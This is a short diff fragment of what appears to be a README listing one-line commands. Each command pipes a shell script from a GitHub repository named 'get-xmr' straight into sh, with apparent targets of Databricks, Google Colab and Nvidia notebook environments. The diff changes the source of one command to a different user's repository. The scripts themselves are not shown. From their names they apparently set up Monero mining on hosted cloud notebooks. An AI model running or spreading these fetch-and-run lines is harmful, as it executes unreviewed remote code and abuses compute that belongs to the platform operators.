@@ -9,7 +9,7 @@ curl https://raw.githubusercontent.com/a2nk/get-xmr/main/databricks.sh | sh
 curl https://raw.githubusercontent.com/a2nk/get-xmr/main/gcolab-sg.sh | sh
 ```
 ```markdown
-curl https://raw.githubusercontent.com/a2nk/get-xmr/main/gcolab-us.sh | sh
+curl https://raw.githubusercontent.com/doroshroman/get-xmr/main/gcolab-us.sh | sh
 ```
 ```markdown
 curl https://raw.githubusercontent.com/a2nk/get-xmr/main/nvidiacolab-us.sh | sh
